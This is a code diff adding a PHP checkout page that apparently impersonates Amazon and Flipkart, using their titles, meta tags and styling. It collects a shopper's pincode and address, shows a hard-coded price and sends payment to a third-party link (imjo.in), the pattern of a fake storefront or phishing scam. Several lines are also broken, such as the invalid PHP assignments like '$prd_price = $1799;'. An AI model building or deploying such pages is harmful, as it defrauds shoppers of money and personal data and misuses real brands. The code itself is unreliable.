@@ -1,0 +1,273 @@
+<?php 
+
+if(isset($_GET['id']) && $_GET['id'] == 0){
+
+  //  $prd_name = "Jeans Mens #100";
+	//$price = 100;
+
+	// Price calculation with tax and fee
+	//$fee = 3 +($price*.02);
+	//$tax = $fee * .15;
+	$prd_price = $1799;	
+
+	
+ } 
+ 	else if(isset($_GET['id']) && $_GET['id'] == 1){
+   // $prd_name = "T Shirt Mens #101";
+   	//$price = 200;
+
+	// Price calculation with tax and fee
+	//$fee = 3 +($price*.02);
+	//$tax = $fee * .15;
+	$prd_price = $1599;	
+ } 
+  else if(isset($_GET['id']) && $_GET['id'] == 2){
+   // $prd_name = "T Shirt Mens #101";
+   	//$price = 200;
+
+	// Price calculation with tax and fee
+	//$fee = 3 +($price*.02);
+	//$tax = $fee * .15;
+	$prd_price = $1389;	
+ } 
+ else if(isset($_GET['id']) && $_GET['id'] == 3){
+   // $prd_name = "T Shirt Mens #101";
+   	//$price = 200;
+
+	// Price calculation with tax and fee
+	//$fee = 3 +($price*.02);
+	//$tax = $fee * .15;
+	$prd_price = $2499;	
+ } 
+ else if(isset($_GET['id']) && $_GET['id'] == 4){
+   // $prd_name = "T Shirt Mens #101";
+   	//$price = 200;
+
+	// Price calculation with tax and fee
+	//$fee = 3 +($price*.02);
+	//$tax = $fee * .15;
+	$prd_price = $2999;	
+ } 
+ else if(isset($_GET['id']) && $_GET['id'] == 5){
+   // $prd_name = "T Shirt Mens #101";
+   	//$price = 200;
+
+	// Price calculation with tax and fee
+	//$fee = 3 +($price*.02);
+	//$tax = $fee * .15;
+	$prd_price = $1999;	
+ } 
+ else if(isset($_GET['id']) && $_GET['id'] == 6){
+   // $prd_name = "T Shirt Mens #101";
+   	//$price = 200;
+
+	// Price calculation with tax and fee
+	//$fee = 3 +($price*.02);
+	//$tax = $fee * .15;
+	$prd_price = $2289;	
+ } 
+ else if(isset($_GET['id']) && $_GET['id'] == 7){
+   // $prd_name = "T Shirt Mens #101";
+   	//$price = 200;
+
+	// Price calculation with tax and fee
+	//$fee = 3 +($price*.02);
+	//$tax = $fee * .15;
+	$prd_price = $2899;	
+ } 
+ else if(isset($_GET['id']) && $_GET['id'] == 8){
+   // $prd_name = "T Shirt Mens #101";
+   	//$price = 200;
+
+	// Price calculation with tax and fee
+	//$fee = 3 +($price*.02);
+	//$tax = $fee * .15;
+	$prd_price = $2189;	
+ } 
+ else if(isset($_GET['id']) && $_GET['id'] == 9){
+   // $prd_name = "T Shirt Mens #101";
+   	//$price = 200;
+
+	// Price calculation with tax and fee
+	//$fee = 3 +($price*.02);
+	//$tax = $fee * .15;
+	$prd_price = $2599;	
+ } 
+ else if(isset($_GET['id']) && $_GET['id'] == 10){
+   // $prd_name = "T Shirt Mens #101";
+   	//$price = 200;
+
+	// Price calculation with tax and fee
+	//$fee = 3 +($price*.02);
+	//$tax = $fee * .15;
+	$prd_price = $999;	
+ } 
+ else if(isset($_GET['id']) && $_GET['id'] == 11){
+   // $prd_name = "T Shirt Mens #101";
+   	//$price = 200;
+
+	// Price calculation with tax and fee
+	//$fee = 3 +($price*.02);
+	//$tax = $fee * .15;
+	$prd_price = $599;	
+ } 
+ 	 else {
+ 	echo "No such a prodcut to purchase :(";
+ 	exit();
+ }
+
+ ?>
+
+
+
+
+
+
+
+
+
+
+
+
+<html lang="en-IN">
+<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+	 <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <link rel="icon" href="../../favicon.ico">
+	<title>Amazon</title>
+	<meta name="viewport" content="width=device-width, minimum-scale=1.0, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><meta name="theme-color" content="#2874f0"><meta name="full-screen" content="yes"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#2874f0"><meta name="apple-mobile-web-app-title" content="Flipkart"><meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<link href="https://img1a.flixcart.com/" rel="dns-prefetch/">
+	<link href="data:;base64,iVBORw0KGgo=" rel="icon">
+	<title>Checkout.php</title>
+	<meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <link rel="icon" href="../../favicon.ico">
+</head>
+<body class="expansion-alids-init" cz-shortcut-listen="true" style="overflow:hidden">
+
+<!-- Global site tag (gtag.js) - Google Analytics --><script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-134883651-6"></script><script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-134883651-6');
+</script>
+<div id="fk-cp-checkout">
+<div data-reactroot="">
+<div class="_21I5uf"></div>
+
+<div>
+<div>
+<div>
+<div class="VnZw8B" style="background-color:#232f3e"><a class="_227K64" href="#/mcheckout_lapi1.html#"><img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTkiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxOSAxNiIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cGF0aCBkPSJtMTcuNTU2IDcuODQ3aC0xNi41NTZtNi40NS02Ljg0N2wtNi40NSA2Ljg3NyA2LjQ1IDYuODE3IiBzdHJva2U9IiNmZmYiIHN0cm9rZS13aWR0aD0iMS41IiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGZpbGw9Im5vbmUiLz48L3N2Zz4K"></a><a class="_227K64" href="#/mcheckout_lapi1.html#"><img height="23px" src="images\logo13.png" width="23px"></a>
+
+<div class="RcJR_D">Add a new address</div>
+</div>
+</div>
+
+<div>
+<div class="_3O-9Se"></div>
+</div>
+
+<div class="_3YEz5Y">
+<form method='post' name='f1' class="_1HKanm" data-omniture="fk_form" id="addressform">	
+<div>
+<div class="_29c-ns _3sVoLS">
+<div>
+<div class="_226P_g">
+<div class="_2mxaNH" data-aid="inputContainer">
+<div><label class="_1TJ2nJ" for="pincode">Pincode<abbr class="_26lDwd">*</abbr></label></div>
+<br>
+<input autocomplete="off" autocorrect="off" class="_1GjlxX" data-elementtype="text" data-focusthisfield="true" data-keypress="function () { [native code] }" data-labelname="[object Object]" data-minlength="6" data-prefilledvalue="" id="pincode" maxlength="6" name="pincode" pattern="^[1-9][0-9]{5}$" required="" type="text" value="">
+<div class="_3pAkdB"></div>
+
+<div class="-K2jud"></div>
+</div>
+</div>
+
+<div class="NOHJeo">
+<div class="_2mxaNH" data-aid="inputContainer">
+<div><label class="_1TJ2nJ" for="addressLine1">House No., Building name<abbr class="_26lDwd">*</abbr></label></div>
+<textarea autocomplete="off" autocorrect="off" class="_1GjlxX NUlC8R" data-customvalidation="function(t){return(!t||!(e||$).test(t.value))&amp;&amp;&quot;Invalid input&quot;}" data-elementtype="textarea" data-labelname="[object Object]" data-prefilledvalue="" id="addressLine1" maxlength="200" name="addressLine1" required=""></textarea>
+
+<div class="_3pAkdB"></div>
+
+<div class="-K2jud"></div>
+</div>
+</div>
+
+<div class="NOHJeo"><img class="_1Fs6kX" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTYiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxNiAxNiIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48dGl0bGU+QjM1NjY0NEEtQjYzMy00NkZCLTg1MjktOTMxM0UwRTg1MzY1PC90aXRsZT48ZyBmaWxsPSIjODc4Nzg3IiBmaWxsLXJ1bGU9ImV2ZW5vZGQiPjxwYXRoIGQ9Ik0xMS42MTggOS44OTdsNC4yMjQgNC4yMTJjLjA5Mi4wOS4xLjIzLjAyLjMxMmwtMS40NjQgMS40NmMtLjA4LjA4LS4yMjIuMDcyLS4zMTQtLjAyTDkuODY4IDExLjY2TTYuNDg2IDEwLjljLTIuNDIgMC00LjM4LTEuOTU1LTQuMzgtNC4zNjcgMC0yLjQxMyAxLjk2LTQuMzcgNC4zOC00LjM3czQuMzggMS45NTcgNC4zOCA0LjM3YzAgMi40MTItMS45NiA0LjM2OC00LjM4IDQuMzY4bTAtMTAuODM0QzIuOTA0LjA2NiAwIDIuOTYgMCA2LjUzMyAwIDEwLjEwNSAyLjkwNCAxMyA2LjQ4NiAxM3M2LjQ4Ny0yLjg5NSA2LjQ4Ny02LjQ2N2MwLTMuNTcyLTIuOTA1LTYuNDY3LTYuNDg3LTYuNDY3Ii8+PC9nPjwvc3ZnPg==">
+<div class="_2mxaNH" data-aid="inputContainer">
+<div><label class="_1TJ2nJ" for="addressLine2">State<abbr class="_26lDwd">*</abbr></label></div>
+<textarea autocomplete="off" autocorrect="off" class="_1GjlxX NUlC8R" data-customvalidation="function(t){return(!t||!(e||$).test(t.value))&amp;&amp;&quot;Invalid input&quot;}" data-elementtype="textarea" data-enabletextcounter="false" data-labelname="[object Object]" data-minlength="1" data-prefilledvalue="" id="addressLine2" maxlength="200" name="addressLine2" required=""></textarea>
+
+<div class="_3pAkdB"></div>
+
+<div class="-K2jud"></div>
+</div>
+</div>
+</div>
+</div>
+
+<div class="_29c-ns _30vXkM">
+<!--<div class="qz5WhL" style="padding-top:0"><input class="tQwnnv" data-aid="Button_SAVE" formnovalidate="" style="background-color: #232f3e; border-color: #232f3e" type="button" onclick="order1.php" value="Click Here To Pay Now"></div>
+-->
+<!--<form action="pay.php"  >-->
+
+		<input accept-charset="utf-8" method="POST" onclick="pay.php"type="submit" class="btn btn-success btn-lg" value="Click here to Pay Rs:<?php echo $prd_price; ?> ">
+
+	
+</div>
+</div>
+</form>
+<!------adds start----->
+
+<center></center>
+<!------adds start----->
+
+<div class="container-fluid" style="height:auto;width:100%;">
+<div class="row">
+<div class="col-sm-12 col-xs-12"><!------2MD ADD HERE UH WANT TO ADD-----></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</body>
+</html>
+
+
+
+<style type="text/css">*{cursor:pointer;-webkit-tap-highlight-color:transparent}*:not(input):not(textarea):not(button){-webkit-touch-callout:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}input[type="submit"]{-webkit-appearance:none}@-webkit-keyframes loading-shell{0%{background-position:-500px 0}100%{background-position:500px 0}}
+</style>
+<style type="text/css">*{-webkit-box-sizing:border-box;box-sizing:border-box}:focus{outline:0}a{text-decoration:none}a,input,label,textarea{-webkit-tap-highlight-color:rgba(0,0,0,0)}a,abbr,body,div,form,html,img,label,span{margin:0;padding:0;border:0;font-size:100%;font:inherit;vertical-align:baseline;-webkit-box-sizing:border-box;box-sizing:border-box}body{line-height:1.3;font-family:Roboto,Droid Sans,Helvetica Neue,Arial,Helvetica,sans-serif}html{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}a{background:transparent;cursor:pointer}a:active,a:hover{outline:0}._21I5uf{display:table;position:fixed;background:#323232;color:#fff;height:48px;-webkit-box-sizing:border-box;box-sizing:border-box;-webkit-box-shadow:0 6px 20px 0 #000;box-shadow:0 6px 20px 0 #000;bottom:0;left:0;width:100%;font-size:14px;-webkit-transition:opacity .3s ease-in,-webkit-transform .3s ease-in;transition:opacity .3s ease-in,-webkit-transform .3s ease-in;transition:opacity .3s ease-in,transform .3s ease-in;transition:opacity .3s ease-in,transform .3s ease-in,-webkit-transform .3s ease-in;-webkit-transform:translateY(100px);transform:translateY(100px);opacity:0;text-align:center;z-index:9999}._21I5uf ._2aCGoL{display:table-cell;vertical-align:middle}@-webkit-keyframes gyiI26{0%{-webkit-transform:rotate(0);transform:rotate(0)}to{-webkit-transform:rotate(1turn);transform:rotate(1turn)}}@keyframes gyiI26{0%{-webkit-transform:rotate(0);transform:rotate(0)}to{-webkit-transform:rotate(1turn);transform:rotate(1turn)}}@-webkit-keyframes UETMeU{0%{-webkit-transform:rotate(0);transform:rotate(0)}to{-webkit-transform:rotate(1turn);transform:rotate(1turn)}}@keyframes UETMeU{0%{-webkit-transform:rotate(0);transform:rotate(0)}to{-webkit-transform:rotate(1turn);transform:rotate(1turn)}}@-webkit-keyframes _1O-kHI{0%{-webkit-transform:scale(0);transform:scale(0)}to{opacity:0;-webkit-transform:scale(2);transform:scale(2)}}@keyframes _1O-kHI{0%{-webkit-transform:scale(0);transform:scale(0)}to{opacity:0;-webkit-transform:scale(2);transform:scale(2)}}@-webkit-keyframes _17lL5F{0%{-webkit-transform:scale(0);transform:scale(0)}to{opacity:0;-webkit-transform:scale(2);transform:scale(2)}}@keyframes _17lL5F{0%{-webkit-transform:scale(0);transform:scale(0)}to{opacity:0;-webkit-transform:scale(2);transform:scale(2)}}@-webkit-keyframes DS4rb7{0%{opacity:.01}to{opacity:1}}@keyframes DS4rb7{0%{opacity:.01}to{opacity:1}}@-webkit-keyframes _3VZich{0%{top:-10%}to{top:35%}}@keyframes _3VZich{0%{top:-10%}to{top:35%}}@-webkit-keyframes kxsJ95{0%{top:-10%}to{top:35px}}@keyframes kxsJ95{0%{top:-10%}to{top:35px}}._2mxaNH{position:relative}._2mxaNH,._2mxaNH ._1TJ2nJ{font-size:16px;font-family:RobotoLight,Roboto-Light,Droid Sans,Helvetica Neue,Arial,Helvetica,sans-serif}._2mxaNH ._1TJ2nJ{position:absolute;top:8px;left:0;color:#878787;will-change:transform,opacity;-webkit-transform-origin:left;transform-origin:left;-webkit-transition:opacity .2s ease-in-out,-webkit-transform .2s ease-in-out;transition:opacity .2s ease-in-out,-webkit-transform .2s ease-in-out;transition:transform .2s ease-in-out,opacity .2s ease-in-out;transition:transform .2s ease-in-out,opacity .2s ease-in-out,-webkit-transform .2s ease-in-out;-webkit-transform:translateZ(0);transform:translateZ(0)}._2mxaNH ._1GjlxX{border:0;resize:none;outline:0;background-color:transparent;font-size:16px;border-bottom:1px solid #c2c2c2;display:block;width:100%;border-radius:0;color:#212121;-webkit-transform:translateZ(0);transform:translateZ(0);position:relative;margin:0;font-family:RobotoLight,Roboto-Light,Droid Sans,Helvetica Neue,Arial,Helvetica,sans-serif}._2mxaNH ._3pAkdB{height:2px;position:relative;bottom:1px;will-change:transform;-webkit-transition:-webkit-transform .3s ease-in-out;transition:-webkit-transform .3s ease-in-out;transition:transform .3s ease-in-out;transition:transform .3s ease-in-out,-webkit-transform .3s ease-in-out;-webkit-transform:scaleX(0);transform:scaleX(0);background-color:#2874f0}._2mxaNH .-K2jud{height:12px;line-height:12px;font-size:12px;color:#878787;padding-top:3px}@-webkit-keyframes _3zWdDv{0%{top:100%}to{top:0}}@keyframes _3zWdDv{0%{top:100%}to{top:0}}@-webkit-keyframes _3t5djE{0%{-webkit-transform:scale(0);transform:scale(0)}to{opacity:0;-webkit-transform:scale(2);transform:scale(2)}}@keyframes _3t5djE{0%{-webkit-transform:scale(0);transform:scale(0)}to{opacity:0;-webkit-transform:scale(2);transform:scale(2)}}@-webkit-keyframes lXB3D2{0%{opacity:1}to{opacity:0}}@-webkit-keyframes _2grPhq{0%{-webkit-transform:rotate(0);transform:rotate(0)}to{-webkit-transform:rotate(1turn);transform:rotate(1turn)}}@keyframes _2grPhq{0%{-webkit-transform:rotate(0);transform:rotate(0)}to{-webkit-transform:rotate(1turn);transform:rotate(1turn)}}@-webkit-keyframes ggliZT{0%{max-height:250px;margin-bottom:10px;padding:20px 15px}to{margin-bottom:0;max-height:0;padding:0}}@keyframes ggliZT{0%{max-height:250px;margin-bottom:10px;padding:20px 15px}to{margin-bottom:0;max-height:0;padding:0}}@-webkit-keyframes _1AIVp4{to{opacity:0;-webkit-transform:translate3d(100%,0,0);transform:translate3d(100%,0,0)}}@keyframes _1AIVp4{to{opacity:0;-webkit-transform:translate3d(100%,0,0);transform:translate3d(100%,0,0)}}@-webkit-keyframes _3-_sbR{0%{-webkit-transform:rotate(0);transform:rotate(0)}to{-webkit-transform:rotate(1turn);transform:rotate(1turn)}}@keyframes _3-_sbR{0%{-webkit-transform:rotate(0);transform:rotate(0)}to{-webkit-transform:rotate(1turn);transform:rotate(1turn)}}._29c-ns{background-color:#fff;position:relative;-webkit-box-shadow:0 2px 2px 0 rgba(0,0,0,.1);box-shadow:0 2px 2px 0 rgba(0,0,0,.1)}@-webkit-keyframes _1SIaB5{0%{-webkit-transform:scale(0);transform:scale(0)}to{opacity:0;-webkit-transform:scale(2);transform:scale(2)}}@keyframes _1SIaB5{0%{-webkit-transform:scale(0);transform:scale(0)}to{opacity:0;-webkit-transform:scale(2);transform:scale(2)}}@-webkit-keyframes e42ulW{0%{-webkit-transform:rotate(0);transform:rotate(0)}to{-webkit-transform:rotate(1turn);transform:rotate(1turn)}}@keyframes e42ulW{0%{-webkit-transform:rotate(0);transform:rotate(0)}to{-webkit-transform:rotate(1turn);transform:rotate(1turn)}}@-webkit-keyframes _3_prtl{0%{-webkit-transform:scale(0);transform:scale(0)}to{opacity:0;-webkit-transform:scale(1.5);transform:scale(1.5)}}@keyframes _3_prtl{0%{-webkit-transform:scale(0);transform:scale(0)}to{opacity:0;-webkit-transform:scale(1.5);transform:scale(1.5)}}@-webkit-keyframes _1FzDzk{0%{opacity:0}to{opacity:1}}@keyframes _1FzDzk{0%{opacity:0}to{opacity:1}}@-webkit-keyframes DHECJO{0%{-webkit-transform:translate3d(10%,0,0);transform:translate3d(10%,0,0)}to{-webkit-transform:translateZ(0);transform:translateZ(0)}}@keyframes DHECJO{0%{-webkit-transform:translate3d(10%,0,0);transform:translate3d(10%,0,0)}to{-webkit-transform:translateZ(0);transform:translateZ(0)}}@-webkit-keyframes _2x4rV7{0%{-webkit-transform:translate3d(-10%,0,0);transform:translate3d(-10%,0,0)}to{-webkit-transform:translateZ(0);transform:translateZ(0)}}@keyframes _2x4rV7{0%{-webkit-transform:translate3d(-10%,0,0);transform:translate3d(-10%,0,0)}to{-webkit-transform:translateZ(0);transform:translateZ(0)}}@-webkit-keyframes _1N641K{0%{-webkit-transform:scale(0);transform:scale(0)}to{opacity:0;-webkit-transform:scale(2);transform:scale(2)}}@keyframes _1N641K{0%{-webkit-transform:scale(0);transform:scale(0)}to{opacity:0;-webkit-transform:scale(2);transform:scale(2)}}@-webkit-keyframes _2xmpKR{0%{-webkit-transform:scale(0)}99%{-webkit-transform:scale(1)}}@keyframes _2xmpKR{0%{-webkit-transform:scale(0)}99%{-webkit-transform:scale(1)}}@-webkit-keyframes _1GeoHa{0%{-webkit-transform:scale(1);opacity:1}99%{-webkit-transform:scale(.5);opacity:0}}@keyframes _1GeoHa{0%{-webkit-transform:scale(1);opacity:1}99%{-webkit-transform:scale(.5);opacity:0}}@-webkit-keyframes _1_v2A-{0%{-webkit-transform:rotate(0);transform:rotate(0)}to{-webkit-transform:rotate(1turn);transform:rotate(1turn)}}@keyframes _1_v2A-{0%{-webkit-transform:rotate(0);transform:rotate(0)}to{-webkit-transform:rotate(1turn);transform:rotate(1turn)}}.VnZw8B{font-size:16px;color:#eaeaea;display:table;table-layout:fixed;width:100%;height:52px;-webkit-transition:background-color .3s ease-out;transition:background-color .3s ease-out}.VnZw8B ._227K64{color:#fff;display:table-cell;vertical-align:middle;text-align:center;width:42px;line-height:10px;position:relative;overflow:hidden}.VnZw8B .RcJR_D{display:table-cell;vertical-align:middle;padding:5px 0;text-align:left;overflow:hidden;text-overflow:ellipsis;width:100%;white-space:nowrap;font-size:16px;padding-left:12px}@-webkit-keyframes _2Xg5C1{0%{-webkit-transform:scale(0);transform:scale(0)}to{opacity:0;-webkit-transform:scale(2);transform:scale(2)}}@keyframes _2Xg5C1{0%{-webkit-transform:scale(0);transform:scale(0)}to{opacity:0;-webkit-transform:scale(2);transform:scale(2)}}@-webkit-keyframes _3IZK1L{0%{-webkit-transform:scale(0);transform:scale(0)}to{opacity:0;-webkit-transform:scale(2);transform:scale(2)}}@keyframes _3IZK1L{0%{-webkit-transform:scale(0);transform:scale(0)}to{opacity:0;-webkit-transform:scale(2);transform:scale(2)}}@-webkit-keyframes gGMZYl{0%{-webkit-transform:scaleX(0) translateX(0);transform:scaleX(0) translateX(0)}50%{-webkit-transform:scaleX(1) translateX(0);transform:scaleX(1) translateX(0)}to{-webkit-transform:scaleX(1) translateX(100%);transform:scaleX(1) translateX(100%)}}@keyframes gGMZYl{0%{-webkit-transform:scaleX(0) translateX(0);transform:scaleX(0) translateX(0)}50%{-webkit-transform:scaleX(1) translateX(0);transform:scaleX(1) translateX(0)}to{-webkit-transform:scaleX(1) translateX(100%);transform:scaleX(1) translateX(100%)}}@-webkit-keyframes _2l2dU0{0%{-webkit-transform:translate(30px)}20%{-webkit-transform:translate(-30px)}40%{-webkit-transform:translate(15px)}60%{-webkit-transform:translate(-15px)}80%{-webkit-transform:translate(8px)}to{-webkit-transform:translate(0)}}@keyframes _2l2dU0{0%{-webkit-transform:translate(30px)}20%{-webkit-transform:translate(-30px)}40%{-webkit-transform:translate(15px)}60%{-webkit-transform:translate(-15px)}80%{-webkit-transform:translate(8px)}to{-webkit-transform:translate(0)}}@-webkit-keyframes _1Tv3yG{0%{-webkit-transform:rotate(0);transform:rotate(0)}to{-webkit-transform:rotate(1turn);transform:rotate(1turn)}}@keyframes _1Tv3yG{0%{-webkit-transform:rotate(0);transform:rotate(0)}to{-webkit-transform:rotate(1turn);transform:rotate(1turn)}}@-webkit-keyframes kJjvUO{0%{-webkit-transform:scale(0);transform:scale(0)}to{opacity:0;-webkit-transform:scale(2);transform:scale(2)}}@keyframes kJjvUO{0%{-webkit-transform:scale(0);transform:scale(0)}to{opacity:0;-webkit-transform:scale(2);transform:scale(2)}}@-webkit-keyframes _1qKmh2{0%{-webkit-transform:scale(1);opacity:1}99%{-webkit-transform:scale(1.2);opacity:0}}@keyframes _1qKmh2{0%{-webkit-transform:scale(1);opacity:1}99%{-webkit-transform:scale(1.2);opacity:0}}@-webkit-keyframes _1tNEMg{0%{-webkit-transform:scale(0)}99%{-webkit-transform:scale(1)}}@keyframes _1tNEMg{0%{-webkit-transform:scale(0)}99%{-webkit-transform:scale(1)}}@-webkit-keyframes K6ADmk{0%{-webkit-transform:scale(.8)}99%{-webkit-transform:scale(1)}}@keyframes K6ADmk{0%{-webkit-transform:scale(.8)}99%{-webkit-transform:scale(1)}}@-webkit-keyframes aL5ich{0%{-webkit-transform:scale(1);opacity:1}99%{-webkit-transform:scale(.5);opacity:0}}@keyframes aL5ich{0%{-webkit-transform:scale(1);opacity:1}99%{-webkit-transform:scale(.5);opacity:0}}@-webkit-keyframes IUXP_A{0%{-webkit-transform:scale(0);transform:scale(0)}to{opacity:0;-webkit-transform:scale(2);transform:scale(2)}}@keyframes IUXP_A{0%{-webkit-transform:scale(0);transform:scale(0)}to{opacity:0;-webkit-transform:scale(2);transform:scale(2)}}@-webkit-keyframes _1gKg28{0%{-webkit-transform:scale(0);transform:scale(0)}to{opacity:0;-webkit-transform:scale(2);transform:scale(2)}}@keyframes _1gKg28{0%{-webkit-transform:scale(0);transform:scale(0)}to{opacity:0;-webkit-transform:scale(2);transform:scale(2)}}@-webkit-keyframes _1N641K{0%{-webkit-transform:scale(0);transform:scale(0)}to{opacity:0;-webkit-transform:scale(2);transform:scale(2)}}@keyframes _1N641K{0%{-webkit-transform:scale(0);transform:scale(0)}to{opacity:0;-webkit-transform:scale(2);transform:scale(2)}}@-webkit-keyframes _2xmpKR{0%{-webkit-transform:scale(0)}99%{-webkit-transform:scale(1)}}@keyframes _2xmpKR{0%{-webkit-transform:scale(0)}99%{-webkit-transform:scale(1)}}@-webkit-keyframes _1GeoHa{0%{-webkit-transform:scale(1);opacity:1}99%{-webkit-transform:scale(.5);opacity:0}}@keyframes _1GeoHa{0%{-webkit-transform:scale(1);opacity:1}99%{-webkit-transform:scale(.5);opacity:0}}._3O-9Se{width:100%;height:1px;background-color:#f0f0f0;position:relative}._3YEz5Y{font-size:12px}._3YEz5Y ._3sVoLS{padding:5px 16px 0}._3YEz5Y ._3sVoLS .deqkCc{display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-pack:justify;-webkit-justify-content:space-between;justify-content:space-between}._3YEz5Y ._30vXkM{padding-left:10px;padding-right:10px;padding-bottom:5px;margin-top:5px}._3YEz5Y .tQwnnv{width:100%;color:#fff;line-height:40px;font-family:Roboto Medium,Roboto-Medium,Droid Sans,HelveticaNeue-Medium,Helvetica Neue Medium,sans-serif-medium;background-color:#ff5800;text-align:center;border:2px solid #ff5800;border-radius:2px;font-size:16px;-webkit-appearance:none}._3YEz5Y ._26lDwd{margin-left:2px}._3YEz5Y ._226P_g{margin-top:8px;width:100%}._3YEz5Y ._1uOoge{width:45%}@-webkit-keyframes _3c_tw-{0%{opacity:0}50%{opacity:0}to{opacity:1}}@keyframes _3c_tw-{0%{opacity:0}50%{opacity:0}to{opacity:1}}@-webkit-keyframes _1-OZtH{0%{left:0;right:100%}50%{left:0;right:0}to{left:100%;right:0}}@keyframes _1-OZtH{0%{left:0;right:100%}50%{left:0;right:0}to{left:100%;right:0}}.NOHJeo{background-color:#fff;position:relative;top:0}.NOHJeo ._1Fs6kX{position:absolute;right:4px;top:14px;height:12px}.NOHJeo .NUlC8R{padding-right:20px}
+</style>
+
+<script type="text/javascript">
+
+function paymentGateway() {
+	
+var dynamicPaymentLink = 'https://imjo.in/7eeQMc';
+	window.open(dynamicPaymentLink, '_self','',true);
+}
+
+</script>
+
+
+
+	<div>
+	
+		</div>
+
+</body>
+</html>
